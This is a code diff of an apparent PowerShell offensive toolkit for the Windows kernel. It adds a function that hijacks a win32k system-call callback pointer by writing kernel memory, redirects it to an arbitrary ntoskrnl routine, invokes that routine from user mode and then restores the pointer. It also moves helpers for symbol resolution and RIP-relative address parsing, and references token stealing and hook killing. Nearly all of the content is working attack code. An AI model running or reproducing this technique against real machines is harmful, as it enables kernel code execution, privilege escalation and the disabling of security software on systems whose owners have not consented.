@@ -225,6 +225,26 @@ Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel Kernel
 Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel KUser
 #>
 
+# Ssdt Callback Hijack
+<#
+Clear-Host
+Write-Host
+
+$KernelVA = Get-KernelBaseAddress
+"VA: 0x{0:X16}" -f [Int64]$KernelVA
+
+$Values = $KernelVA, 0L
+$PA = Invoke-SsdtCallbackHijack `
+    -Function MmGetPhysicalAddress `
+    -Values $Values
+if ($PA -notin @(0,1)) {
+    "PA: 0x{0:X16}" -f $PA
+}
+
+Write-Host
+return
+#>
+
 # Process < Misc>
 # Get-KernelThreadList /-ProcessID/ 
 # Read-ProcessMemory /-ProcessID / /-Offset/ -BytesToRead 1024 /-OutHex/
@@ -5936,6 +5956,209 @@ function Get-DriverAddress {
     }
     throw "Could not retrieve runtime kernel base address for $DriverName"
 }
+function Get-PdbSymbolOffset {
+    param (
+        [string]$BinaryPath = "C:\Windows\System32\ntoskrnl.exe",
+        [string]$FunctionName = "MiAllocateVirtualMemory",
+        [string]$DownloadFolder = "C:\Symbols"
+    )
+
+    # 1. Pure Type Generation Reflection
+    try {
+        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.ScopeName -eq "PdbRaw" } | select -Last 1
+        $PdbRaw = $Module.GetTypes()[0]
+    }
+    catch {
+        $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("null", 1).DefineDynamicModule("PdbRaw", $False).DefineType("null")
+        @(
+            @('SymInitialize', 'dbghelp.dll', [bool],   @([IntPtr], [string], [bool])),
+            @('SymCleanup',    'dbghelp.dll', [bool],   @([IntPtr])),
+            @('SymLoadModuleEx','dbghelp.dll', [uint64], @([IntPtr], [IntPtr], [string], [string], [uint64], [uint32], [IntPtr], [uint32])),
+            @('SymFromName',   'dbghelp.dll', [bool],   @([IntPtr], [string], [IntPtr]))
+        ) | % {
+            $Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
+        }
+        $PdbRaw = $Module.CreateType()
+    }
+
+    # 2. Extract RSDS details from Binary via BinaryReader
+    $fs = [System.IO.File]::OpenRead($BinaryPath)
+    $br = New-Object System.IO.BinaryReader($fs)
+    $found = $false
+    while ($fs.Position -lt ($fs.Length - 24)) {
+        if ($br.ReadUInt32() -eq 0x53445352) { $found = $true; break }
+        $fs.Position -= 3
+    }
+    if (-not $found) { $br.Close(); $fs.Close(); throw "RSDS signature not found." }
+
+    $guid = (New-Object System.Guid(,$br.ReadBytes(16))).ToString("N").ToUpper()
+    $age = $br.ReadUInt32()
+    $sb = New-Object System.Text.StringBuilder
+    while (($b = $br.ReadByte()) -ne 0) { [void]$sb.Append([char]$b) }
+    $pdbName = Split-Path $sb.ToString() -Leaf
+    $br.Close(); $fs.Close()
+
+    # 3. Handle local cache check or download
+    $destination = Join-Path $DownloadFolder "$pdbName\$guid$age\$pdbName"
+    if (-not (Test-Path $destination)) {
+        Write-Host "PDB missing locally. Downloading..." -ForegroundColor Yellow
+        New-Item -ItemType Directory -Path (Split-Path $destination) -Force | Out-Null
+        $url = "https://msdl.microsoft.com/download/symbols/$pdbName/$guid$age/$pdbName"
+        Invoke-WebRequest -Uri $url -OutFile $destination -UserAgent "Microsoft-Symbol-Server/10.0.0.0"
+    }
+
+    # 4. Invoke PInvoke APIs via PdbRaw Methods
+    # FIX: Use the current process handle instead of a random integer to guarantee initialization context
+    $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
+    $dummyBase = [uint64]0x10000000
+
+    # FIX: Ensure SymInitialize is passed true or the local target directory to register the module context properly
+    $PdbDir = Split-Path $destination
+    [void]$PdbRaw::SymInitialize($hProcess, $PdbDir, $false)
+    
+    # Load the module layout cleanly
+    $modBase = $PdbRaw::SymLoadModuleEx($hProcess, [IntPtr]::Zero, $destination, $null, $dummyBase, [uint32]0, [IntPtr]::Zero, [uint32]0)
+
+    if ($modBase -eq 0) {
+        [void]$PdbRaw::SymCleanup($hProcess)
+        throw "Failed to load module inside dbghelp. Ensure the PDB target matches your architecture."
+    }
+
+    # FIX: Standardized unmanaged allocation via native Marshal instead of custom commandlets
+    $BufferSize = 88 + 2000
+    $pSymbolInfo = New-IntPtr -Size $BufferSize -InitialValue 88
+    [Marshal]::WriteInt32($pSymbolInfo, 76, 2000)
+
+    # Run the symbol search
+    $matched = $PdbRaw::SymFromName($hProcess, $FunctionName, $pSymbolInfo)
+
+    if ($matched) {
+        $AbsoluteAddress = [Marshal]::ReadInt64($pSymbolInfo, 56) # Offset 56 = Address
+        $offset = [int64]($AbsoluteAddress - $dummyBase)
+        $result = "0x$($offset.ToString("X"))"
+    } else {
+        $result = $null
+    }
+
+    # Cleanup memory and symbol paths
+    [Marshal]::FreeHGlobal($pSymbolInfo)
+    [void]$PdbRaw::SymCleanup($hProcess)
+
+    if ($null -ne $result) { return $result } else { throw "Function '$FunctionName' not found." }
+}
+function Find-RipRelativeAddress {
+    param (
+        [Parameter(Mandatory=$true)]
+        [IntPtr]$InstructionBaseVA,
+        [Parameter(Mandatory=$true)]
+        [byte[]]$ByteBuffer,
+        [Parameter(Mandatory=$true)]
+        [byte[]]$OpcodePattern,
+        [Parameter(Mandatory=$true)]
+        [int]$InstructionSize
+    )
+
+    $PatternIndex = -1
+    for ($i = 0; $i -lt ($ByteBuffer.Length - $OpcodePattern.Length); $i++) {
+        $Match = $true
+        for ($j = 0; $j -lt $OpcodePattern.Length; $j++) {
+            if ($ByteBuffer[$i + $j] -ne $OpcodePattern[$j]) {
+                $Match = $false
+                break
+            }
+        }
+        if ($Match) {
+            $PatternIndex = $i
+            break
+        }
+    }
+
+    if ($PatternIndex -eq -1) {
+        return $null
+    }
+
+    $DisplacementOffset = $PatternIndex + ($InstructionSize - 4)
+    $Displacement = [BitConverter]::ToInt32($ByteBuffer, $DisplacementOffset)
+    $NextInstructionVA = [IntPtr]::Add($InstructionBaseVA, ($PatternIndex + $InstructionSize))
+    return [IntPtr]::Add($NextInstructionVA, $Displacement)
+}
+Function Invoke-SsdtCallbackHijack {
+    param (
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Function,
+        [object[]]$Values = $null,
+
+        [string]$Driver     = 'win32k.sys',
+        [string]$Target     = 'NtUserFrostCrashedWindow',
+        [Byte[]]$MovPattern = @(72, 139, 5),
+        [Int32]$MovSize     = 7
+    )
+
+    $osBuild = gwmi -ClassName Win32_OperatingSystem | select -ExpandProperty BuildNumber
+    if ($osBuild -ge 22000) {
+        Write-Warning "Not Supported in new Windows 11 Build's"
+        return
+    }
+
+    # -----------------------------------------------------------------
+    # 1. EXECUTE EXISTING DYNAMIC SSDT RESOLUTION
+    # -----------------------------------------------------------------
+
+    $DriverBase = Get-DriverAddress   -DriverName $Driver
+    $TableRVA   = Get-FunctionAddress -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
+    $StubRVA    = Get-FunctionAddress -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
+
+    $TableVA    = [IntPtr]::Add($DriverBase, $TableRVA)
+    $StubVA     = [IntPtr]::Add($DriverBase, $StubRVA)
+
+    $SyscallInstructionDataVA = [IntPtr]::Add($StubVA, 1)
+    $FullSyscallID    = Read-VirtualAddress -VA $SyscallInstructionDataVA -AsInt
+    $DynamicIndex     = $FullSyscallID -band 0xFFF
+
+    $EntryOffset      = $DynamicIndex * 4
+    $EntryVA          = [IntPtr]::Add($TableVA, $EntryOffset)
+    $CompressedOffset = Read-VirtualAddress -VA $EntryVA -AsInt
+    $RealOffset       = $CompressedOffset -shr 4
+    $RealAddress      = [IntPtr]::Add($TableVA, $RealOffset)
+
+    # -----------------------------------------------------------------
+    # 2. APPLY UNIVERSAL PARSER
+    # -----------------------------------------------------------------
+
+    # Cache the execution block locally
+    $AddressData = Read-VirtualAddress -VA $RealAddress -BlockSize 64
+    $LiveVariableVA = Find-RipRelativeAddress -InstructionBaseVA $RealAddress -ByteBuffer $AddressData -OpcodePattern $MovPattern -InstructionSize $MovSize
+
+    if ($null -eq $LiveVariableVA) {
+        throw "Universal parser failed to match target instruction pattern."
+    }
+
+    $CallbackVA = Read-VirtualAddress -VA $LiveVariableVA -AsLong
+
+    # -----------------------------------------------------------------
+    # 3. HIJACK Address, Invoke, RESTORE Address
+    # -----------------------------------------------------------------
+
+    try {
+    
+        $RVA = Get-PdbSymbolOffset -FunctionName $Function
+        if ($RVA -eq $null -or $RVA -le 0) {
+            throw "Could not locate PsTerminateProcess RVA"
+        }
+        
+        Write-VirtualAddress -VA $LiveVariableVA -Long ([IntPtr]::Add((Get-KernelBaseAddress), $RVA)) | Out-Null      
+        
+        return (
+            Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int64 -Values $Values
+        )
+        return $null
+
+
+    } Finally {
+        Write-VirtualAddress -VA $LiveVariableVA -Long $CallbackVA | Out-Null
+    }
+}
 #endregion
 #region Process
 function Invoke-MemoryRead {
@@ -6555,133 +6778,6 @@ function Invoke-TokenSteal {
     } else {
         Write-Error "Failed to map virtual address via the driver."
     }
-}
-
-function Get-PdbSymbolOffset {
-    param (
-        [string]$BinaryPath = "C:\Windows\System32\ntoskrnl.exe",
-        [string]$FunctionName = "MiAllocateVirtualMemory",
-        [string]$DownloadFolder = "C:\Symbols"
-    )
-
-    # 1. Pure Type Generation Reflection
-    try {
-        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.ScopeName -eq "PdbRaw" } | select -Last 1
-        $PdbRaw = $Module.GetTypes()[0]
-    }
-    catch {
-        $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("null", 1).DefineDynamicModule("PdbRaw", $False).DefineType("null")
-        @(
-            @('SymInitialize', 'dbghelp.dll', [bool],   @([IntPtr], [string], [bool])),
-            @('SymCleanup',    'dbghelp.dll', [bool],   @([IntPtr])),
-            @('SymLoadModuleEx','dbghelp.dll', [uint64], @([IntPtr], [IntPtr], [string], [string], [uint64], [uint32], [IntPtr], [uint32])),
-            @('SymFromName',   'dbghelp.dll', [bool],   @([IntPtr], [string], [IntPtr]))
-        ) | % {
-            $Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
-        }
-        $PdbRaw = $Module.CreateType()
-    }
-
-    # 2. Extract RSDS details from Binary via BinaryReader
-    $fs = [System.IO.File]::OpenRead($BinaryPath)
-    $br = New-Object System.IO.BinaryReader($fs)
-    $found = $false
-    while ($fs.Position -lt ($fs.Length - 24)) {
-        if ($br.ReadUInt32() -eq 0x53445352) { $found = $true; break }
-        $fs.Position -= 3
-    }
-    if (-not $found) { $br.Close(); $fs.Close(); throw "RSDS signature not found." }
-
-    $guid = (New-Object System.Guid(,$br.ReadBytes(16))).ToString("N").ToUpper()
-    $age = $br.ReadUInt32()
-    $sb = New-Object System.Text.StringBuilder
-    while (($b = $br.ReadByte()) -ne 0) { [void]$sb.Append([char]$b) }
-    $pdbName = Split-Path $sb.ToString() -Leaf
-    $br.Close(); $fs.Close()
-
-    # 3. Handle local cache check or download
-    $destination = Join-Path $DownloadFolder "$pdbName\$guid$age\$pdbName"
-    if (-not (Test-Path $destination)) {
-        Write-Host "PDB missing locally. Downloading..." -ForegroundColor Yellow
-        New-Item -ItemType Directory -Path (Split-Path $destination) -Force | Out-Null
-        $url = "https://msdl.microsoft.com/download/symbols/$pdbName/$guid$age/$pdbName"
-        Invoke-WebRequest -Uri $url -OutFile $destination -UserAgent "Microsoft-Symbol-Server/10.0.0.0"
-    }
-
-    # 4. Invoke PInvoke APIs via PdbRaw Methods
-    # FIX: Use the current process handle instead of a random integer to guarantee initialization context
-    $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
-    $dummyBase = [uint64]0x10000000
-
-    # FIX: Ensure SymInitialize is passed true or the local target directory to register the module context properly
-    $PdbDir = Split-Path $destination
-    [void]$PdbRaw::SymInitialize($hProcess, $PdbDir, $false)
-    
-    # Load the module layout cleanly
-    $modBase = $PdbRaw::SymLoadModuleEx($hProcess, [IntPtr]::Zero, $destination, $null, $dummyBase, [uint32]0, [IntPtr]::Zero, [uint32]0)
-
-    if ($modBase -eq 0) {
-        [void]$PdbRaw::SymCleanup($hProcess)
-        throw "Failed to load module inside dbghelp. Ensure the PDB target matches your architecture."
-    }
-
-    # FIX: Standardized unmanaged allocation via native Marshal instead of custom commandlets
-    $BufferSize = 88 + 2000
-    $pSymbolInfo = New-IntPtr -Size $BufferSize -InitialValue 88
-    [Marshal]::WriteInt32($pSymbolInfo, 76, 2000)
-
-    # Run the symbol search
-    $matched = $PdbRaw::SymFromName($hProcess, $FunctionName, $pSymbolInfo)
-
-    if ($matched) {
-        $AbsoluteAddress = [Marshal]::ReadInt64($pSymbolInfo, 56) # Offset 56 = Address
-        $offset = [int64]($AbsoluteAddress - $dummyBase)
-        $result = "0x$($offset.ToString("X"))"
-    } else {
-        $result = $null
-    }
-
-    # Cleanup memory and symbol paths
-    [Marshal]::FreeHGlobal($pSymbolInfo)
-    [void]$PdbRaw::SymCleanup($hProcess)
-
-    if ($null -ne $result) { return $result } else { throw "Function '$FunctionName' not found." }
-}
-function Find-RipRelativeAddress {
-    param (
-        [Parameter(Mandatory=$true)]
-        [IntPtr]$InstructionBaseVA,
-        [Parameter(Mandatory=$true)]
-        [byte[]]$ByteBuffer,
-        [Parameter(Mandatory=$true)]
-        [byte[]]$OpcodePattern,
-        [Parameter(Mandatory=$true)]
-        [int]$InstructionSize
-    )
-
-    $PatternIndex = -1
-    for ($i = 0; $i -lt ($ByteBuffer.Length - $OpcodePattern.Length); $i++) {
-        $Match = $true
-        for ($j = 0; $j -lt $OpcodePattern.Length; $j++) {
-            if ($ByteBuffer[$i + $j] -ne $OpcodePattern[$j]) {
-                $Match = $false
-                break
-            }
-        }
-        if ($Match) {
-            $PatternIndex = $i
-            break
-        }
-    }
-
-    if ($PatternIndex -eq -1) {
-        return $null
-    }
-
-    $DisplacementOffset = $PatternIndex + ($InstructionSize - 4)
-    $Displacement = [BitConverter]::ToInt32($ByteBuffer, $DisplacementOffset)
-    $NextInstructionVA = [IntPtr]::Add($InstructionBaseVA, ($PatternIndex + $InstructionSize))
-    return [IntPtr]::Add($NextInstructionVA, $Displacement)
 }
 Function Invoke-ShadowSsdtHookKill {
     param (
